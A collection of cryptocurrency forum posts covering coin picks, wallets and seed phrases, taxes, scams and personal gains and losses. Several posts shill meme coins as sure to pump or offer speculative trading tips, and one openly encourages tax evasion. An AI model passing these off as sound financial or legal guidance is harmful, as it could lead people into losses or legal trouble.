Obviously there will always be a knock off, but what coins do we actually see a use for in the future of crypto, I dont think we can have DogeCumsOnElonsTits, etc, etc, in a future of crypto  and even half of the coins out there now what do they actually bring to the table? 
I could see crypto gaming taking off if they can focus on the gameplay first instead of a simple buy this earn passive rewards bs, 
NFT gaming compared to just the art makes  a lot more sense,
Name some projects you could see making some solid fundamental moves in the future!

 As Cardano is ranked #4 in terms of market capitalization (\~$70bn), by far the largest PoS network, we shall try to understand the reason for this valuation. We shall be inspecting both the protocol and adoption strategy and conclude why we believe Casper is stronger both in terms of longer term fundamentals, but also short term relative value.

Read the full article here: [https://ghoststaking.com/casper-vs-cardano/](https://ghoststaking.com/casper-vs-cardano/)

Extract from the article:

*Cardano evolution has been at a glacial pace, taking many years of research and development to launch a decentralized PoS blockchain with smart contract capabilities. This lengthy period of time may have been fine in years past, however with an increasingly crowded layer 1 project space, competition will results in an increase to the speed of innovation, and its clear that Cardano is at a huge risk of falling behind the pack. With regard to Casper, It is specifically in anticipation of this pace of change, that the CasperLabs team have engineered the Casper blockchain to be fully pluggable and upgradable (including the Execution Engine, Network Engine and Consensus Layer). For Cardano, a split has been implemented between the CSL (Settlement Layer) and CCL (Computation Layer) in anticipation for future soft forks, however this implementation has exposed the network to risks of censorship.*

I know everyone is talking about the markets and how they go green then red but I wanna spread the gains(and pain). I was wondering if there is a way to tip crypto quickly to people who don't have wallets? 

I don't have much to give but I respect these guys so much. They bust their asses especially during the holidays with Amazon and wild hours so I want to give them a little to give them some hope. If anyone has any ideas I'd appreciate it. Remember the wild infrastructure and people that allow a package to be dropped at your door in 2 days!

Just as the name suggests, I did something you should NEVER do.  

I started investing in Cryptos during the RobinHood/GME/AMC debacle.  I got burned by RH, so I turned to Crypto.

Every Coin except for one I researched tirelessly.  I studied what gives Crypto value.  I learned about the best exchanges and how best to secure your Coins.  The one Coin I did not research was Luna Terra and here is why: those are the names of my two dogs (they're sisters).  They're husky mixes from a WV kill shelter I got when they were 12 weeks old.  When I saw this Coin I bought a bunch with absolutely no research and without a second thought.

Luna Terra is currently at an ATH and by far my most successful purchase.

Does anyone else have a crazy/dumb/lucky success story?

What a surprise (it's really not) SHIB is sinking faster than the Titanic.
Now. Some have jumped ship already, made life boats out of cash and are on their way to their private Islands.
 It's only a matter of time before the remaining bag holders try and find themselves a new ship in hopes that their dream of lambos won't die.

I personally don't really have a horse in this race. I prefer gradual (relatively) low risk gains over fast, stand in the fire potential gains.

That being said I am curious as to which you guys think is the next to alienate the non trading masses?

I've seen some shilling of BAN:

Which would make sense: funny name (banano),

Con: I've seen shilling for this coin for a long while and it's not really amounted to anything big.


I personally like the idea of PUSSY (pussy financial):

There's been a big spike the last few days,

On the meme front, what could be memier than getting major publications to use headlines like "PUSSY pumps" etc...,

It would be nice to get a kitty on the meme throne. After all they're the internet's favourite pet with the internet's favourite money.




TLDR:
SHIB=DEAD
which meme coins time is it?

As we see many newcomers enter the market, they don't have a sense for the market like those who have had long term experience. 

A lot of easy to avoid mistakes are made. People lose a ton of money. 

Those who have weathered the 2018 crash have some tough skin and rigid rules they will never break in the crypto market. Tons of this insight comes from past mistakes we have all made. 

A rule I've learned not to break is to never sell 100% of a crypto to buy a new one. Always save around 10%. If I had done this with ETH over the last 5 years my ETH bag would be substantial. 

What is your #1 crypto rule that you don't ever break?

I recently got the confidence enough to jump into trading. I've been holding since 6 months now, trying to understand all I could about how Crypto works (at least, currently), before taking the next step.

I made some profits on my small five coins portfolio, so I did a rebalance and got another small profit, so I know that rebalance does work when the coins are up. 

But my question is: Should you rebalance when all your coins are down? 

For example: Let's say we have $1000, so $200 each coin. But market is bearing, and now some coins are less than $200, If you rebalance on this situation, will you get better profits when market goes bullish again? 

I will make some simulations later using programming to check if that's a good idea over holding till coins are up again, but I want to hear your opinions.

About day trading, what are the % of profit for a coin to buy/sell? I've read that 1%, 2%, 5% are the most used values. What are your tips? Do you have any good blog/video explaining about this?

Thanks in advance.

Hey there, so straight to the point. What's the best crypto platform for South Africa?
I've done my fair amount of research but none of the well know platforms cater 100% for the South African market.
Luno is way to simple with no variety at all.
KuCoin is an option I've been looking into but i see a lot of issues with support happening lately.
Crypto.com has also been on my radar. 
What would be my best option?
A platform with low fees and the possibility to withdrawal without any complications or limitations.

Would really appreciate some help on this topic.

Each time we receive MOONs distributions it would be considered taxable income. Even though there's only like $25,000 in daily lol, there is still technically a fair market value price for MOONs which makes it income. 

So reddit...is there going to be an easy way to report these? It'd be really awesome if reddit could generate a 1099-MISC form or similar for countries other than the US.

(Please spare me the "just don't pay them" argument because I don't care if you think it's right or not, I'm personally not into tax evasion. I've always reported all my crypto income and I'd like to remain compliant w/any reddit tokens as well.)

Last night on my binance account have made 4700 trades Buy high Sell low and causing my portfolio drop 95% so lose $68k. All those trades have been itselfwithin 2h. After i contacted support they keep saying asking did you have API, i didnt have any API sure 100% as it shows on Binance itself.

They saying me it can be caused by your pc maybe some virus. Soo its not possible because at that timeframe my pc was offline and it can be proved by Pc log file, but binance not checking that prove that i send.

Also at that time i didnt was even on binance. 

Any help or Idea ?

The year was 2020. I earned 30k moons for my shitposting/help in this fine community over the years (2017-2020). Then in 2020 when moons were released, I of course set up my vault. Not thinking much of it, I took a screenshot instead of writing down the seed like I usually do. But next day, I was a victim of a sim swap attack. It actually went a lot further than just a sim swap. Someone tried to access my bank accounts, emails and cloud storage, USPS account. It all happened in a matter of 2 hours. Went so far, that I had to file a police report. Ended up not sleeping for 2 days (literally), while trying to change over 300 passwords with a newly acquired password manager. Got so paranoid, that I nuked all of my emails (not accounts themselves). Everything dating back to the day Gmail opened to public.

In that state of panic, I wiped my entire cloud storage account where the screenshot of the Reddit vault seed was located. Ended up changing my phone, which meant using a new phone. So now to recover my vault, I need the seed. which is long gone. [Now that Reddit wants to implement community points](https://twitter.com/iamRahul20x/status/1455950490366263301?s=20) into the entire website, this brings back bad memories and a lot of "*Im such a dumbass* feelings.

Now I have over 30k moons and no way to access them. So dont be like me, back up your seed. You never know how much these moons will be worth or where this whole concept will go. Now I have to sit and just look at the moon count next to my name. Actually one of the reasons I come here less often. Every time I leave a comment, I can see the moon count.

I am a dead whale on the moon. Thank you for coming to my TED Talks.

I want to do my part to educate and inform other crypto investors, so please be careful to do thorough research before investing. The other day, there was a multi million dollar scam involving the token "Squid Game", and I recently noticed that a new token emerged by the name of "Baby Squid Game" I think is likely another scam, but here is a video with more of my thoughts: [https://www.youtube.com/watch?v=fBOO2cl89f4](https://www.youtube.com/watch?v=fBOO2cl89f4)

Do you guys think this is a scam or not?

In may of this year, I started a year-long sabbatical. I've always wanted to invest into crypto but never had the time or energy to dedicate to research it. I started casually looking in June and ended up putting together my fist small portfolio in August. Since then, I've learned a ton. Some of the things I learned were eye-opening, some confirmed what I've always suspected and some were down-right shocking. I thought I'd share what I've learned so far. If only a single new person reads this and finds value in it, it will have been worth it :)  


**(1) Coverage of mainstream media paints a horrible wrong picture of crypto**  
I get it, "crypto market did nothing special today" is not news. Nobody, especially those not into crypto, wants to read about that. Unfortunately this means that only the extremes make it into the mainstream media, painting a picture of crypto being money-printing machines with nearly no risk.  
I will admit that this is what drew me to the space in the first place. Fortunately I did my research before parting with my precious dollars, but not everybody is as diligent. Unfortunately this often results in a bad first experience for lots of new investors, as they just throw cash at random coins and get frustrated that they're down 20% a week later.

One of the most impactful quotes I've read while researching was: "You're not in the business of investing. You're in the business of risk management.". While lots of places and communities that I've visited, hammer on "dont invest what you can't lose" and "DYOR", I believe this is a third one that should be hammered into new investors.  


**(2) Memecoins are effectively pyramid schemes**  
Yeah, I'm looking at you, SHIB. There should be WAY more warnings about these. Big investors who manage to manipulate a community into doing the recruiting for them. The fake youtube livestreams using old elon livestreams, with titles like "elon says 0.23 for shib end of november", the insane echochambers the "diamond hands" create and the constant completely unrealistic price-predictions all serve to try and effectively steal people's money. To take SHIB as the example here, I do believe the initial idea of the coin is cool. But it's been completely hijacked by big corrupt whales who are using a community to get more poor people dreaming of a better future, to invest money without knowing the risks.  


**(3) Setting goals is extremely important**  
Setting goals is like the antidote for FOMO. I've tried to swing-trade without a goal and it went horribly. I still feel bad about the decisions I made. Then I swing-traded with a goal in mind. I didn't make ideal profits, but I felt super comfortable with it because I reached most of the goals I set!  
We all know FOMO is a horrible way to guide decisions. Setting goals was the answer for me!  


My personal goal is simple. I'm no rich man, but what I have, I want to try to double over the next 2-3 years so I can start a savings fund for each of my 2 nephews. Both sets of parents have had a really rough last 2 years and both aren't in the best financial situations. I can't wait to show them what crypto can do to alleviate the worry of money for college/university!

So let me explain.. I'm a serial entrepreneur for the past 20 years..never hit it big, but made a few dollars, traveled the world, had the fancy cars and beautiful wife.

Got divorced..lost mostly everything, now 50 snuck up on me and im like holy shit!! You havent been putting much away. I missed out in crypto a few years back because i didnt understand it. (Didnt take the time to) ..anyway..over the last 8 months..ive been dca'ing into btc, eth,sol, ada, and a few more..with my biggest bag btc.

Not quite yet a whole coiner, but almost.

I'm looking at crypto as a potential life saver for someone who screwed yhr pooch and now is staring down the short side of the hill if life.

I couldnt help wonder how many others are looking at crypto the same way. I mean..if Cathy Woods, and half the analysts are right on btc ..in 10 years..even 1 wholecoin is going to be a lifesaver for people like myself.

Anyone else??

Ive been looking at upcoming coin launches and past launches, and Im wondering what the value of investing small sums in multiple ICOs would be. If theyre listed on CMC they usually at least double in the first hour or two( if not crumble after that). Im not saying necessarily that I would sell on that gain every time, but Im not saying I wouldnt. Also, Im in the US, and it seems that there are some restrictions with the US participating in these launch sites. Does anyone have experience with this?

All of us know that shitcoins are a bad long term investment. A lot of us refuse to accept there are huge gains that can be made on shit coins because it might hurt the reputation of the crypto space. In my opinion, do what you want with your money, but dyor and know the risks. 

Obviously life savings and loans should not be taken on shitcoins, as they are high risk, but my $20 in shib is now $90 I can freely invest in shit coins. Here are 2 coins I think might take off.

$ELON: dogelon mars has a diluted market cap of 1b. The depth chart shows the buy pressure for a 12% loss is the same as the sell pressure for a 450% gain, meaning it is way easier for the coin to go up than down. The coin got listed on cdc (with transactions back and forth to artificially increase trading volume) and the price went up 500% in two days, then parabolically dropped and held at 280%. I think the community is strong, and the next exchange to list it will create huge gainz, definitely worth a $20 investment!

$SANTA: I do not know much about this token, but it is fairly new, and with christmas coming up I could see this token mooning, since it is meme season.

The thing to keep in mind with shit coins is they pump and dump quick. If you get huge gains, sell immediately and do not wait for peak or you will loose it.

P.S. what other shitcoins would you recommend investing some spare change into?

Excuse me if this is basic knowledge, I am still new to crypto and I am trying to understand privacy coins such as XMR.

I have a very basic understanding of how the monero blockchain works and how it makes transactions private.
However, I struggle to understand how somebody would hide withdraws. If you cash your monero out onto your bank account or even on some exchange, wouldn't authorities be able to see that and ask questions? Doesn't this defeat the purpose of Monero? Sure you can buy or sell something with XMR anonymously but as soon as you exchange that XMR for usd, that transaction will not be anonymus anymore. So how does a privacy coin do anything as long as you are not involved in money laundering or as long as you are not able to pay rent directly in XMR?

 A lot of people here ask about some random shitcoins or memecoins. They basically want us to do all DYOR for them and tell them if coin is good or not. It doesn't work like that. If you can't do it yourself then you have no idea what you do. You shouldn't trust our opinions and definitely shouldn't gamble money on shitcoins/ memecoins.

If you will be experienced investor  you can do whatever you want. They are responsible, and they only blame themselves if they made a mistake. They can DYOR and understand risk involved.  There is huge difference between beginner or experienced investor gambling their money. But you will probably never become experienced investor if you will gamble  your money away now.

Beginners should start safe. Buy BTC or ETH, spend few months on this sub, learn crypto terminology and observe markets. In few months you will be able to buy some altcoins and probably will understand why you shouldn't touch memecoins/ shitcoins. After another months or years maybe you will be ready to gamble 5/10% of your portfolio on shitpcoins/memecoins. Or maybe not. Many experienced investors do not touche things like that at all. After all it is still gambling. Only difference between beginner and experienced is  that experienced imvestors can see obvious rug pulls and scams, thing you can't do at all. If you are not sure stay away from researching anything new that promise huge gains. There are a lot of safe coins you can invest into. Don't be greedy.

Sorry for noob question Im new. I wanna ask that case. Assume there is coin which supports BEP-20 and ERC-20 transfers. What if I use today BEP-20 and transfered coin to my cold wallet. Next year BSC network not available and I wanna send my coins to another address. Can I send these coins by using ERC-20?(I received with BEP-20 at the beginning) Or I have to use same network exactly?  

If BEP20 and ERC20 just transfers paths I guess there is not problem. Im asking this because u know BSC a lot cheaper than ERC. 

Thanks for answers

Everything I've seen so far points to this being real. 

\#1

The amended code in the branch NFT-DEV under the GitHub commit titled NFT feature makes reference to gameStopMeta and an IPFS URL.  
IPFS is a distributed system for storing and accessing files, websites, applications, and data. IPFS was noted to be used by GameStop previously during their first NFT project reveal. 

\#2

Also found within the JSON files are references to creatorRoyaltyBips, with a value of 500. Bips, otherwise known as basis points, are a unit of measure used in finance to describe the percentage change in the value of financial instruments.   
These findings suggest GameStops NFT marketplace will allow for resale of digital assets, including the ability to pay royalties to the original creator on future transactions.

\#3

GitHub the source for this is mainly used by engineers and software Developers.

\#4

The code was committed to the Loopring GitHub repository by Loopring developer W. Tang.

\#5

 GitHub has public and private repositories, this was submitted to a public one on purpose.

\#6

The code posted on GitHib reveals that GameStop NFT is built on EIP-1155 which allows the creation of Fungible, Non-Fungible, and Semi-Fungible in one single token standard.ERC-1155 is a unique token that supports non-fungible (NFTs) and fungible tokens. Its faster and more efficient than prior iterations.  
This allows flexibility to create unique non-fungible items, such as rare collectibles, artwork, in-game items and fungible items such as in-game currency, points or cosmetic items that can be owned by many people.

\#7

Last Friday, GMEdd.com published clues that Loopring has the technology that GameStop would require to bridge traditional e-commerce and blockchain and engineer the revolution of gaming

\#8

Monday, GMEdd discovered and shared GameStops latest NFT job listings, which detailed interest in Web3.0, Blockchain Gaming, and even an NFT marketplace.

&amp;#x200B;

\#9

**GME Posts on twitter yesterday:**

Well we haven't accepted the proposal yet but as soon as we've dotted our i's, crossed our t's &amp; **put a ring on it**, we hope we will. No set date yet. -SMRT 

\#10

While at Chewy, Ryan Cohen (own 13% of gme) led the stealth Project Bear, committed to disrupting the $9B pet pharma industry. Despite Cohens departure 3 months earlier, Chewy did not roll out or even announce the initiative until it was completely ready for launch.

It is likely that GameStop will not make any splashy public reveals about GameStop NFT until the offering is finalized, following the same playbook as Chewy.

&amp;#x200B;

&amp;#x200B;

Needless to say I've loaded up on LRC and will be holding for long shot.

 Does anyone have the knowledge to help with analyzing the best Kishu can get? I do NOT mean $1 or even 0.01 nonsense.

As you know, now that SHIB is loosing some of the hype due to the recent issues, the attention is somehow, logically is going to be distributed among some other project(s) and thus just want to know if there is any kind of rational analysis (based on history) that might predict the future of KISHU.

**Also, which exchanges are selling Kishu as I checked on CMC it only shows binance which is not working with me.**

Meanwhile in the cryptoverse, two sweet folks are arguing about BTC and XRP going to the moon. I mean I deeply respect them for defending their points not to be the biggest hypocrite and well, *who are we to judge...*

I think they know better and there arguments and points must be based on solid TA imo. **I mean, clearly these two really know some shit about fuck.**

Having such tension, debates and expressions, I'm convinced one of them is solid.

I'll let you enjoy with your own eyes and leave your opinion in the comments!

It got removed from WSB but I hope you can make some use of it as well.

Introduction

Robinhood   sucks, we can all agree on that. They're restricting users from buying   stocks or just take their money right away. Yet, many users still use  it  and keep complaining about it. There are many alternatives, but even   some of them block stocks like GME or AMC. Currently, If you don't  want  to use Robinhood, you have to constantly switch and deal with  other  issues. The reason the platforms are able to restrict users from  buying  certain stocks, is because they're centralized and custodial.  But you  don't have to use them. You can trade them on DeFi

Terra &amp; Mirror Protocol

Terra   is a chain that specializes in various stablecoins pegged to values of   fiat currencies. Terra doesn't support stocks natively. Mirror  Protocol  is a smart contract that adds many stocks (although it's  missing some  i.e. NVIDIA). It's officialy supported by Terra and is  even implemented  in the official wallet.

You can use Mirror to trade, transfer, borrow and lend stocks, with a small fee of 0.1%.

How?

First of all, I recommend you to [learn about Terra](https://np.reddit.com/r/terraluna/comments/p8m4s1/terra_is_an_ecosystem_of_stablecoins_and_this_is/) and optionally [Mirror Protocol](https://docs.mirror.finance/) before you start.

To get into Terra you need to get LUNA or UST, I think I don't have to explain how to get it here.

You can trade directly from the official wallet app (Terra Station).

That's it. 3 simple steps. No KYC (from cross-coin trading). No registration. No waiting. Just like this.

I   just learned about a thing called "market hours" and basically you can   trade stocks only for about half of the day. And it's non-market hours   right now. I think I got too used to crypto.

Hello there!

So I've recently started to explore new ways of earning money with different methods. As it can be seen, there are numerous ways but i didn't explored all of them. I'm currently DCA-ing every week, swing trading, participating in the launchpools and of course staking my cryptos on different platforms which are the safest and have interesting interests rates. My debit card just arrived so 2% return on purchases it is. 

So please share your methods with me as I'm really interested to try them out!

For me as a newcomer to crypto investing it is quite hard to filter out the noise behind crypto investing strategies and building a successful crypto portfolio. What really works and what is not working? Should I chase unicorns or stick to boring established currencies with little chance for exponential growth?

So I did some basic research on how to build my first crypto portfolio:

\#1 Google says:

&gt; The best way to start a crypto portfolio is to give at least a **60% share to Bitcoin followed by a share in Ethereum**, the #2 crypto. Mathematically, the best portfolio for risk adjusted returns in future is estimated at 75% Bitcoin, 25% Ethereum 

\#2 Stock market analogy: 

If I use an analogy from Bogleheads forum - their recommendation for well balanced (risk vs returns) is basically build an investment portfolio consisting of a mix of US and international shares complemented by bonds (60% stocks /40% bonds or 70% stocks /30% bonds).  Where stocks are representing more growth and risk and bonds are less volatile with less growth. 

In crypto world bonds is BTC/ETH and stocks are low and mid-level market cap alts. Take it with grain of salt of course.

\#3 I asked about crypto portfolio allocation here on Reddit and received very interesting replies, I was surprised how consistent they were:

* all respondents advised me to put more than 60% in BTC/ETH
* mid-level market cap alts were also present in their responses, usually around 10% of the allocation
* low-level market cap alts were either disregarded completely or with a notion of "if you like to gamble"

**Conclusion:**

My personal conclusion from my initial research as a newbie to crypto world is to forget completely about flashy news and trending cryptocurrencies (SHIB?) often promoted on multiple channels (Youtube, Instagram, news etc.) and go the old fashioned, boring route of BTC/ETH. If I would like to gamble and try my luck, allocate 5% of portfolio for such flashy coins.

I made a poll with a range of options where you can vote for your preferred porfolio allocation.

**Question:** 

Finally, I want to ask the audience here:

What portfolio allocation do you recommend and why?

Ok, so it seems shit is starting to get real with many projects going nuts.

Right now loads of random coins are pumping crazy amounts, everyday it's a different coin. Be patient! Your time will come if your prepared to wait for it. Even if you invested in shitcoins there is a good chance it'll pump like crazy one day, though I would never advise putting money into them.

Patience is key in Crypto, do not be afraid to miss any and every pump  the market is so big and developing everyday that there will be enough money for everyone, that is if you are patient enough to wait your turn. Trust your investment and then wait.

I decided to write this post because a lot of people right now say they are 'patient' until the market crashes then suddenly they are 'impatient' and panic sell.This is how most of the weak hands are shaken out. Someone who is impatient and can't hold assets for a long period of time will eventually become a victim imo.

Have a plan, stick to that plan, and the odds will be in your favor. 

I would say being patient in Crypto is your greatest skill, followed by investing in projects with good fundaments and that have actual value will succeed in the long run. I can not stress enough how  important patience is, friends!

FYI: This is not financial advice.

It is one of the fastest-growing cryptocurrencies of the present time, gaining rapid momentum owing to its incredible features.

The world of crypto has attracted enough players, and it was only a matter of time before a few crypto space cadets conquered newer territories. Altcoins have gained much prominence of late and have now forayed into space, Mars to be precise with Dogelon Mars (CCC: ELON-USD). Since the time it set its eyes on the crypto space, it has been gaining consistently. Dogelon Mars has stated that it is not merely a meme coin but comes across as an absolute universal currency for the people.

1. Each public key has a private key, yet wallets can hold multiple addresses with only one seed phrase. I see wallets with multiple public addresses, does that mean that one seed phrase imports all private keys in a wallet?
2. Lets say I have a hardware wallet that stores my private keys. Can I import a wallet on any platform? For instance, say I have an Exodus wallet. If exodus wallet was to ever disappear, could I import using my seed phrase on a different wallet? If Metamask was ever to disappear, would there be a way to import the wallet on a different ETH wallet?
3. I know someone that "changes" their public address each time they send crypto to cold storage. Yet they say that all their public addresses they send to puts all their crypto in the same "account". When I was told this, it didn't make much sense as I thought each public address was a sort of safety deposit box in a blockchain, each with a private key.
4. Taxes and crypto are wild, I am expected to keep track of everything and present my transactions when tax time comes. Is there a service or method that most people use? I know that you can export transactions with exchanges and wallets, but what do I do with that information?

I'd like to hold on to my private keys, but do not want to risk it without being sure of how to recover a wallet and by extension the private keys.

Thank you and may the moon be with you.

Hello all,

I was wondering, is there any place on the internet where people who are looking to start a token/coin can meet? I've tried sleuthing the net and haven't found anything like that, would be very interested if there is such a place. I am in a position where I have a very enticing domain name in my possession as well as an idea that can turn into something lucrative, but I'm unable to be the creator of the coin itself mainly due to restrictions in the state I live in. 

&amp;#x200B;

Thank you all for your time,

The token's up nearly 600% in 24h, looks like a solid investment, right? I mean, just look at this graph:

Seems like a great investment opportunity with plenty of room to go up! If only we could zoom out a little...

&amp;#x200B;

Yeah, nothing fishy about that. 

It just seems to confirm that an alarmingly large percentage of traders will trade tokens with not a shred of research. Just a quick google search would be enough to know that this is not a project you want to put your money into. Just a reminder that anyone with a computer and limited programming ability can create a token these days, and how important it is to DYOR.

You make money, you decide what happens with it. This Post https://www.reddit.com/r/CryptoCurrency/comments/qmrys0/this_isnt_the_space_for_your_libertarian_rants/?utm_source=share&amp;utm_medium=ios_app&amp;utm_name=iossmf I see in the vein of property is theft and just the general entitlement about other peoples money is just ridiculous. Youre not entitled to other peoples property, none of us are.

You are an independent individual. Your existence does not make you a slave of some government. Telling other people to pay their taxes online is also fucking stupid.

Take your profits, and decide yourself how much risk you are willing to take. I hope you never get caught and can keep al the money that is yours in the first place. The government isnt worth giving your money, and if you do it cleverly the bureaucrats may be to incompetent to track you. Over.

This year we've seen some play-to-earn games based on crypto rising in popularity for the first time ever. 

People in third world countries are being able to earn more money than they did in regular jobs, and entrepreneurs are creating businesses the consist of making these games accessible to the public in exchange for a share of the profits.

It won't take more than 5 years for the release of the first triple-A crypto game.

This is truly amazing, especially for those who are accustomed to pay expensive amounts of money in order to be able to have some fun with a game. 

I wonder which percentage of this subreddit is currently playing a crypto game and how much this number has been growing month by month.

I've seen a similar post somewhere on the internet and decided to do the same thing. I want to gift both of my 2 kids (age 8 and 13) 0.02 Bitcoin for this Christmas. Yes, they already know the basics about crypto and Bitcoin in general. I think of buying Ledger wallets and sending them some more (0.01) BTC every Christmas/Birthday. I will let them decide what to do with the funds when they are over 18yo. I'll try my best to safely hodl and refill the wallets. Is there anything that I'm missing or any recommendations?

So I'm always looking for ways to maximize my portfolio earnings. 

I saw an add for Nexo and it seems intriguing.

Earning 8% on ethereum without having it locked seems pretty cool.

But then how safe is it and do they actually pay what's listed?

It says paid daily do they pay you in the same coins you hold or do they have their own crypto they use for rewards?

Are rewards locked at all or can you use them regularly? 

And if your using nexo I need a character count so I'll ask what crypto you think is best suited for this type of thing. Obviously I'm not keeping anything there that's going to be earning more staking it or anything like that.

Converting WordPress into a DAPP for decentralized payments

[https://youtu.be/m-WsyYVOdZ0](https://youtu.be/m-WsyYVOdZ0)

Requirements

WordPress.

* Woocommerce plugin active and configured.
* Obtain a BEP20 address to receive payments.
* I[nstall the Gastcoin Gateway plugin and configure it](https://wordpress.org/plugins/gastcoin-gateway/).
* How to install Gastcoin Gateway plugin

&amp;#x200B;

Go to the "Plugins" menu in the bar on your left and click on "add new".

add new plugin

&amp;#x200B;

2) The plugin finder will open and, on the right side, type "Gastcoin gateway" to find the plugin.

&amp;#x200B;

3) Click on install now and then click on activate.

activate gastcoin gateway

&amp;#x200B;

With this you would already be installed Gastcoin Gateway with all the necessary functions to make our Woocommerce work as DAPP to make decentralized collections.

How to configure the Gastcoin Gateway plugin

Go to the menu bar on your left and click on Gastcoin Gateway.

gastcoin gateway

2) If your website is already in dollars you don't need to touch the conversion part. If your website is in another currency, you must add the amount equivalent to 1 dollar according to your currency. This value may change depending on your currency so you may have to make changes more than once.

&amp;#x200B;

convert wordpress into a dapp

&amp;#x200B;

3) If you want a custom payment page you will need to create a new page, add the shortcode \[gastcoin\_gateway\], copy the permalink of the newly created page and paste it in the Redirect URL for payment field.

&amp;#x200B;

4) Now go to the WooCommerce section in the left bar and click on settings.

5) Click on the payment tab and look for the Gastcoin Gateway plugin. Here you can choose the name this payment method will have, its description and, most importantly, your ACCOUNT ADDRESS which would be the BEP20 address of your decentralized wallet, where you will receive payments. You can get a BEP20 address very easily with the Metamask APP.

turn your wordpress into a dapp

Would WordPress be 100% decentralized with Gastcoin Gateway?

With Gastcoin Gateway you would not be turning your WordPress into a 100% decentralized DAPP, everything will still depend on your server when serving content and storing media. What you would be using in WordPress in a decentralized way is the way of selling in WooCommerce since you would be going from charging through banks to make the process of buying and selling directly from person to person through the blockchain.

With this we would have covered the explanation of how to convert your WordPress into a DAPP. In the next article we will explain how to make decentralized client-side payments .

The title is self-explanatory, if you are one of those people, what is the reasoning of posting the same shit over and over again? This sub has evolved in terms of shitpost, number of comments, number of posts mentioning moons, etc... But I feel now we need to stop reposts from this news over and over again. The fucking NY major receiving his paycheck on bitcoin and the EA selling NFTs, I can understand it gets posted 3 or 4 times, but you can see 30 times the same shit on a single day. PLEASE STOP.

I have been mining with my 1650 super for months and I have finally got almost 900 RVN
I get around 12 - 12.9 mh/s

But I've seen people with renting rigs and mining solo and getting huge rewards so I went to mining rig rentals and I am getting a 2GH/S rig for 6 hours for almost 700 RVN
Do you think I'll find atleast one block in 6 hours ?

I cannot afford my college fees and other stuff so do you think it's ok to risk all my earnings to become rich or should I stay with what I've got and be patient ( Sorry for this little thing I wanted to complete the 500 character limit and also this Is my first time asking something online )

There are the Uber rich who dont give shit about fuck and in the unfortunate event of the impending fiat collapse, will end up on their feet. 

There are people like us, who have somewhat of a stable backing with crypto as a hedge against inflation and a financial apocalypse. 

There are, however, people who work day and night, work so damn hard so that they can just eek by with the government financially against them. They dont have the time to DYOR into how to protect themselves in a financial crisis. Sadly, this amounts to an enormous population. Relatively innocent victims of power-hungry politicians and an irresponsible fed. 

The Bitcoin charity (name still TBD) can be set up to provide support to that third group when the bubble bursts. In the end, crypto was made for positive change. We are the only ones with the smarts and foresight that can make it happen. 

Whos with me?!

Sorry if this has been discussed and answered but I'm seeing pricing difference between the 3 on crypto. Webull, coinbase pro and blockfi. Its not much difference but enough to make me wonder whats going on?

I use fidelity pro for stocks and webull for charting the price on stocks will be extremely close if not exact.

But the crypto platforms have deviations. 

Is this something you also encounter and just shrug it off as platform delay or something?

If this is a newbie stupid comment feel free to downvote into oblivion!

For me about 5 years ago I started to dabble in crypto, nothing serious just investing small amounts in bitcoin here and there, then one day I thought lets set up a recurring payment for 20 a month, and every month Id just look at coins that I thought were somewhat interesting or had a lot of hype, pick my top 4 and buy 5 worth of each, like clockwork, every month without fail. Not caring about bull runs, or bear markets, not thinking the price is too inflated to buy now and not waiting for a set price. Did this for 5 years now, total investment of 1200, didnt cash out, occasionally pulled funds from one asset to another, some did extremely well, others not so much, 5 years on, Ive invested next to nothing, but my portfolio is in the 5 figure mark, not really a life changing amount, but not bad for someone just dabbling, I dont spend a huge amount of time researching, just 30 mins or so every couple of days. So to all the fence sitters, just invest, play around and have fun learning. Im not intending on selling and Im certainly not planning on trying to make huge sums.  If I lost it all tomorrow wouldnt really care, would still just carry on doing the same.

Scammers are Smarter than you think, they know how people work, to be honest People are more predictable than they think, this is a big reason behind why technical analysis works, and people are quite similar to each other and we are quite similar to animals, now don't be offended, we have the same nature as animals do, to get things we love with minimal effort and always have fun, this is what an animal would do, a dog will always try to survive and have fun, there are no goals in that Dog's life, except surviving and having fun so it will try the easiest way to that goal.

as humans, we also try to achieve goals in the easiest way possible, without noticing some important things before that, like 'why?', for example, if a dog is not trained, it will take anything you put in front of it, even if it's poisonous, he doesn't ask himself 'why?', but humans can always ask yourself 'why?' before doing anything, and remember just because your instincts tell you the best way is the easiest, it doesn't mean the best way necessarily is the easiest way.

&amp;#x200B;

enough of this, let's get some real crypto info.

in 2018 there was a project called Bitconnect, that you have probably heard of, just look at how many people invested in it, it used to be on the top 10 list in 2017, and they had a strong community, this is possible to happen to you too.

let's have a look at another example

people used to fall for this a lot, fake accounts that were pretending to be verified users with names of famous people, Elon musk, for example, claiming that they have a program that you should send some bitcoin and they will give you 2x back or something, hopefully, people on this sub are smarter to fall for that.

In the end, I just want to say scammers will try to hunt you and they are smarter than you think, please do more research on anything you are about to do and be careful and ask yourself why? more, like why is he willing to give me free money?

I didn't buy DOGE, I didn't buy SHIB because I don't like to buy things are literally just worthless joke lottery tickets. Even worse then these two is ELON. I mean it's clearly a copy cat meme coin with no worth. However we all have those nights where we get a few beers deeper than we should and buy some weird shit on Amazon. unfortunately my thumb was more used to opening [crypto.com](https://crypto.com) and thankfully they have a daily buy limit, 

So I will probably lose $100, but the worst part is the feeling of having disrespected my ETH, ADA, ALGO, BTC, VET, XLM, ANKR, and MATIC that I put such thought and research into before buying. So I apologize to every other fellow moron that I shamed for buying DOGE or SHIB. Hopefully we all drink less and research more. I will buy some therapy and a locker for my phone if ELON moons.

Ill lead out by saying Im very bullish on this project. I originally FOMOed in back in May when it was pumping and have been loading my bags for a few months now during all the dips. 

Partnership with the Sacramento Kings:
https://www.nba.com/kings/news/sacramento-kings-and-blockchain-company-ankr-launch-multi-year-partnership

As found on the ANKR homepage :

Ankr is the only platform that combines node infrastructure, staking, and DeFi to make developing and earning easy. Your next step in crypto starts here.
www.ankr.com

I rarely ever see ankr mentioned on this sub. Just trying to show it some more love.
-------------------------------
1 : 2021-11-04
Sometimes I feel like there is no hope for humanity... There was a thread on another cryptocurrency subreddit from someone who bought the dip on Squid Game, while he knew it was a scam. 

It's like willingly giving away your money to scammers, why would you want to do that? That person believes it's now not a scam anymore, that's why he bought.

Well, it doesn't matter. There are enough shitcoin out there already to gamble on. Why would you have to pick the one that did a rug pull.

It's no wonder so many people lose money with crypto, if all they are looking for is the next 1000x.

Let's say you find a 1000x shitcoin, when do you sell? At 10x? 100x? 1000x? What if it goes back to 0?

**Don't invest in shitcoin is my advice, but if you do, don't invest in scams.**

